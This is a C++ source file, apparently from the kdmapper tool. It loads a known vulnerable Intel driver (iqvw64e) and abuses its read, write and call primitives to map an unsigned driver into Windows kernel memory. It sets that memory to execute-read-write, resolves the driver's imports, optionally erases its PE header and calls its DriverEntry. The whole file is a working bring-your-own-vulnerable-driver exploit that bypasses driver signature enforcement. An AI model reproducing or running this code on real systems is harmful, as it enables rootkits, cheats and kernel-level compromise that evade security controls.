#include "kdmapper.hpp"

HANDLE iqvw64e_device_handle = NULL;
bool bInit = false;

void RelocateImageByDelta(portable_executable::vec_relocs relocs, const uint64_t delta);
bool ResolveImports(portable_executable::vec_imports imports);

HANDLE kdmapper::IntelHandle() {
	return iqvw64e_device_handle;
}

LONG WINAPI SimplestCrashHandler(EXCEPTION_POINTERS* ExceptionInfo)
{
	if (ExceptionInfo && ExceptionInfo->ExceptionRecord)
		Log("[!!] Crash at addr 0x%llx by 0x%llx", ExceptionInfo->ExceptionRecord->ExceptionAddress, ExceptionInfo->ExceptionRecord->ExceptionCode);
	else
		Log("[!!] Crash");

	if (iqvw64e_device_handle)
		intel_driver::Unload(iqvw64e_device_handle);

	return EXCEPTION_EXECUTE_HANDLER;
}

uint64_t kdmapper::AllocMdlMemory(uint64_t size, uint64_t* mdlPtr) {
	/*added by psec*/
	LARGE_INTEGER LowAddress, HighAddress;
	LowAddress.QuadPart = 0;
	HighAddress.QuadPart = 0xffff'ffff'ffff'ffffULL;

	uint64_t pages = (size / PAGE_SIZE) + 1;
	auto mdl = intel_driver::MmAllocatePagesForMdl(iqvw64e_device_handle, LowAddress, HighAddress, LowAddress, pages * (uint64_t)PAGE_SIZE);
	if (!mdl) {
		Log("[-] Can't allocate pages for mdl");
		return { 0 };
	}

	uint32_t byteCount = 0;
	if (!intel_driver::ReadMemory(iqvw64e_device_handle, mdl + 0x028 /*_MDL : byteCount*/, &byteCount, sizeof(uint32_t))) {
		Log("[-] Can't read the _MDL : byteCount");
		return { 0 };
	}

	if (byteCount < size) {
		Log("[-] Couldn't allocate enough memory, cleaning up");
		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
		intel_driver::FreePool(iqvw64e_device_handle, mdl);
		return { 0 };
	}

	auto mappingStartAddress = intel_driver::MmMapLockedPagesSpecifyCache(iqvw64e_device_handle, mdl, nt::KernelMode, nt::MmCached, NULL, FALSE, nt::NormalPagePriority);
	if (!mappingStartAddress) {
		Log("[-] Can't set mdl pages cache, cleaning up.");
		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
		intel_driver::FreePool(iqvw64e_device_handle, mdl);
		return { 0 };
	}

	const auto result = intel_driver::MmProtectMdlSystemAddress(iqvw64e_device_handle, mdl, PAGE_EXECUTE_READWRITE);
	if (!result) {
		Log("[-] Can't change protection for mdl pages, cleaning up");
		intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, mappingStartAddress, mdl);
		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
		intel_driver::FreePool(iqvw64e_device_handle, mdl);
		return { 0 };
	}
	Log("[+] Allocated pages for mdl");

	if (mdlPtr)
		*mdlPtr = mdl;

	return mappingStartAddress;
}

bool kdmapper::Init()
{
	if (bInit) {
		Log("[-] Cannot reinitialize kdmapper!");
		return true;
	}
	SetUnhandledExceptionFilter(SimplestCrashHandler);
	iqvw64e_device_handle = intel_driver::Load();
	if (iqvw64e_device_handle == INVALID_HANDLE_VALUE)
	{
		Log("Failed to initialize vulnerable driver");
		return false;
	}

	bInit = true;
	return true;
}

void kdmapper::Dispose()
{
	if (iqvw64e_device_handle)
		intel_driver::Unload(iqvw64e_device_handle);
}

uint64_t kdmapper::MapDriver(std::wstring driverName, ULONG64 param1, ULONG64 param2, intel_driver::ALLOCATION_TYPE allocType, bool free, bool destroyHeader, bool PassAllocationAddressAsFirstParam, bool PassTextSizeAsSecondParam, mapCallback callback, NTSTATUS* exitCode)
{
	if (INVALID_FILE_ATTRIBUTES == GetFileAttributesW(driverName.c_str()) && GetLastError() == ERROR_FILE_NOT_FOUND)
	{
		Log("[-] File %ls doesn't exist", driverName.c_str());
		return 0;
	}

	std::vector<uint8_t> raw_image = { 0 };
	if (!kdmapper_utils::ReadFileToMemory(driverName, &raw_image)) {
		Log("[-] Failed to read image to memory");
		Dispose();
		return 0;
	}

	return MapDriver(raw_image.data(), param1, param2, allocType, free, destroyHeader, PassAllocationAddressAsFirstParam, PassTextSizeAsSecondParam, callback, exitCode);
}

uint64_t kdmapper::MapDriver(BYTE* data, ULONG64 param1, ULONG64 param2, intel_driver::ALLOCATION_TYPE allocType, bool free, bool destroyHeader, bool PassAllocationAddressAsFirstParam, bool PassTextSizeAsSecondParam, mapCallback callback, NTSTATUS* exitCode) {
	Init();

	const PIMAGE_NT_HEADERS64 nt_headers = portable_executable::GetNtHeaders(data);

	if (!nt_headers) {
		Log("[-] Invalid format of PE image");
		return 0;
	}

	if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
		Log("[-] Image is not 64 bit");
		return 0;
	}

	uint64_t image_size = nt_headers->OptionalHeader.SizeOfImage;

	void* local_image_base = VirtualAlloc(nullptr, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!local_image_base)
		return 0;

	DWORD TotalVirtualHeaderSize = (IMAGE_FIRST_SECTION(nt_headers))->VirtualAddress;
	image_size = image_size - (destroyHeader ? TotalVirtualHeaderSize : 0);

	uint64_t kernel_image_base = 0;
	uint64_t mdlptr = 0;
	switch (allocType) {
	case intel_driver::ALLOCATION_TYPE::MDL:
	{
		kernel_image_base = AllocMdlMemory(image_size, &mdlptr);
		break;
	}
	case intel_driver::ALLOCATION_TYPE::StandardPool:
	{
		kernel_image_base = intel_driver::AllocatePool(iqvw64e_device_handle, nt::POOL_TYPE::NonPagedPool, image_size);
		break;
	}
	case intel_driver::ALLOCATION_TYPE::Continuous:
	{
		LARGE_INTEGER maxAddress = { 0 };
		maxAddress.QuadPart = MAXULONG64;
		kernel_image_base = intel_driver::MmAllocateContiguousMemory(iqvw64e_device_handle, image_size, maxAddress);

		auto mdl = intel_driver::IoAllocateMdl(
			iqvw64e_device_handle,
			(PVOID)kernel_image_base,
			image_size,
			FALSE,
			FALSE
		);
		if (!mdl) {
			Log("[-] Can't allocate mdl");
			return 0;
		}
		intel_driver::MmProbeAndLockPages(iqvw64e_device_handle, (PVOID)mdl);

		auto mappingStartAddress = intel_driver::MmMapLockedPagesSpecifyCache(iqvw64e_device_handle, mdl, nt::KernelMode, nt::MmCached, NULL, FALSE, nt::NormalPagePriority);
		if (!mappingStartAddress) {
			Log("[-] Can't set mdl pages cache, cleaning up.");
			return 0;
		}

		const auto result = intel_driver::MmProtectMdlSystemAddress(iqvw64e_device_handle, mdl, PAGE_EXECUTE_READWRITE);
		if (!result) {
			Log("[-] Can't change protection for mdl pages, cleaning up");
			return 0;
		}
		Log("[+] Changed permissions to PAGE_EXECUTE_READWRITE");
		break;
	}
	case intel_driver::ALLOCATION_TYPE::LargeContinuous:
	{
		size_t pagesToAlloc = image_size >> PAGE_2MB_SHIFT;
		pagesToAlloc += ADDRMASK_EPT_PML2_OFFSET(image_size) ? 1 : 0;

		LARGE_INTEGER maxAddress = { 0 };
		maxAddress.QuadPart = MAXULONG64;

		kernel_image_base = intel_driver::MmAllocateContiguousMemory(iqvw64e_device_handle, (pagesToAlloc + 1) * PAGE_2MB_SIZE, maxAddress);
		uint64_t physical_image_base = 0;
		intel_driver::GetPhysicalAddress(iqvw64e_device_handle, kernel_image_base, &physical_image_base);
		uint64_t offset_to_next_page = PAGE_2MB_SIZE - ADDRMASK_EPT_PML2_OFFSET(physical_image_base);
		kernel_image_base += offset_to_next_page;
		Log("[+] Relocated : 0x%llx - 0x%llx - 0x%llx", kernel_image_base, physical_image_base + offset_to_next_page, (pagesToAlloc + 1) * PAGE_2MB_SIZE);

		auto mdl = intel_driver::IoAllocateMdl(
			iqvw64e_device_handle, 
			(PVOID)kernel_image_base, 
			pagesToAlloc * PAGE_2MB_SIZE, 
			FALSE, 
			FALSE
		);
		if (!mdl) {
			Log("[-] Can't allocate mdl");
			return 0;
		}
		intel_driver::MmProbeAndLockPages(iqvw64e_device_handle, (PVOID)mdl);

		auto mappingStartAddress = intel_driver::MmMapLockedPagesSpecifyCache(iqvw64e_device_handle, mdl, nt::KernelMode, nt::MmCached, NULL, FALSE, nt::NormalPagePriority);
		if (!mappingStartAddress) {
			Log("[-] Can't set mdl pages cache, cleaning up.");
			return 0;
		}

		const auto result = intel_driver::MmProtectMdlSystemAddress(iqvw64e_device_handle, mdl, PAGE_EXECUTE_READWRITE);
		if (!result) {
			Log("[-] Can't change protection for mdl pages, cleaning up");
			return 0;
		}
		Log("[+] Changed permissions to PAGE_EXECUTE_READWRITE");

		break;
	}
	default:
	{
		Log("[-] Unsupported memory type allocation: 0x%x", allocType);
		break;
	}
	}

	do {
		if (!kernel_image_base) {
			Log("[-] Failed to allocate remote image in kernel");
			break;
		}

		Log("[+] Image base has been allocated at %p", reinterpret_cast<void*>(kernel_image_base));

		// Copy image headers

		memcpy(local_image_base, data, nt_headers->OptionalHeader.SizeOfHeaders);

		// Copy image sections

		const PIMAGE_SECTION_HEADER current_image_section = IMAGE_FIRST_SECTION(nt_headers);
		size_t size_of_code = 0;

		for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
			if ((current_image_section[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
				continue;
			if (!strcmp((const char*)current_image_section[i].Name, ".text")) {
				size_of_code = current_image_section[i].SizeOfRawData;
			}
			auto local_section = reinterpret_cast<void*>(reinterpret_cast<uint64_t>(local_image_base) + current_image_section[i].VirtualAddress);
			memcpy(local_section, reinterpret_cast<void*>(reinterpret_cast<uint64_t>(data) + current_image_section[i].PointerToRawData), current_image_section[i].SizeOfRawData);
		}
		if (PassTextSizeAsSecondParam) {
			param2 = size_of_code;
		}

		uint64_t realBase = kernel_image_base;
		if (destroyHeader) {
			kernel_image_base -= TotalVirtualHeaderSize;
			Log("[+] Skipped 0x%x bytes of PE Header", TotalVirtualHeaderSize);
		}

		// Resolve relocs and imports

		RelocateImageByDelta(portable_executable::GetRelocs(local_image_base), kernel_image_base - nt_headers->OptionalHeader.ImageBase);

		if (!ResolveImports(portable_executable::GetImports(local_image_base))) {
			Log("[-] Failed to resolve imports");
			kernel_image_base = realBase;
			break;
		}

		// Write fixed image to kernel

		if (!intel_driver::WriteMemory(iqvw64e_device_handle, realBase, (PVOID)((uintptr_t)local_image_base + (destroyHeader ? TotalVirtualHeaderSize : 0)), image_size)) {
			Log("[-] Failed to write local image to remote image");
			kernel_image_base = realBase;
			break;
		}

		// Call driver entry point

		const uint64_t address_of_entry_point = kernel_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;

		Log("[<] Calling DriverEntry %p", reinterpret_cast<void*>(address_of_entry_point));

		if (callback) {
			if (!callback(&param1, &param2, realBase, image_size, mdlptr)) {
				Log("[-] Callback returns false, failed!");
				kernel_image_base = realBase;
				break;
			}
		}

		NTSTATUS status = 0;
		if (!intel_driver::CallKernelFunction(iqvw64e_device_handle, &status, address_of_entry_point, (PassAllocationAddressAsFirstParam ? realBase : param1), param2)) {
			Log("[-] Failed to call driver entry");
			kernel_image_base = realBase;
			break;
		}

		if (exitCode)
			*exitCode = status;

		Log("[+] DriverEntry returned 0x%x", status);

		if (free) {
			switch (allocType) {
			case intel_driver::ALLOCATION_TYPE::MDL:
			{
				intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, realBase, mdlptr);
				intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdlptr);
				intel_driver::FreePool(iqvw64e_device_handle, mdlptr);
				break;
			}
			case intel_driver::ALLOCATION_TYPE::StandardPool:
			{
				intel_driver::FreePool(iqvw64e_device_handle, realBase);
				break;
			}
			case intel_driver::ALLOCATION_TYPE::Continuous:
			{
				break;
			}
			case intel_driver::ALLOCATION_TYPE::LargeContinuous:
			{
				break;
			}
			}
		}


		VirtualFree(local_image_base, 0, MEM_RELEASE);
		return realBase;

	} while (false);


	VirtualFree(local_image_base, 0, MEM_RELEASE);

	intel_driver::FreePool(iqvw64e_device_handle, kernel_image_base);

	return 0;
}

void RelocateImageByDelta(portable_executable::vec_relocs relocs, const uint64_t delta) {
	for (const auto& current_reloc : relocs) {
		for (auto i = 0u; i < current_reloc.count; ++i) {
			const uint16_t type = current_reloc.item[i] >> 12;
			const uint16_t offset = current_reloc.item[i] & 0xFFF;

			if (type == IMAGE_REL_BASED_DIR64)
				*reinterpret_cast<uint64_t*>(current_reloc.address + offset) += delta;
		}
	}
}

bool ResolveImports(portable_executable::vec_imports imports) {
	for (const auto& current_import : imports) {
		ULONG64 Module = kdmapper_utils::GetKernelModuleAddress(current_import.module_name);
		if (!Module) {
#if !defined(_DEBUG)
			std::cout << "[-] Dependency " << current_import.module_name << " wasn't found" << std::endl;
#endif
			return false;
		}

		for (auto& current_function_data : current_import.function_datas) {
			uint64_t function_address = intel_driver::GetKernelModuleExport(iqvw64e_device_handle, Module, current_function_data.name);

			if (!function_address) {
				//Lets try with ntoskrnl
				if (Module != intel_driver::ntoskrnlAddr) {
					function_address = intel_driver::GetKernelModuleExport(iqvw64e_device_handle, intel_driver::ntoskrnlAddr, current_function_data.name);
					if (!function_address) {
#if !defined(DISABLE_OUTPUT)
						std::cout << "[-] Failed to resolve import " << current_function_data.name << " (" << current_import.module_name << ")" << std::endl;
#endif
						return false;
					}
				}
			}

			*current_function_data.address = function_address;
		}
	}

	return true;
}
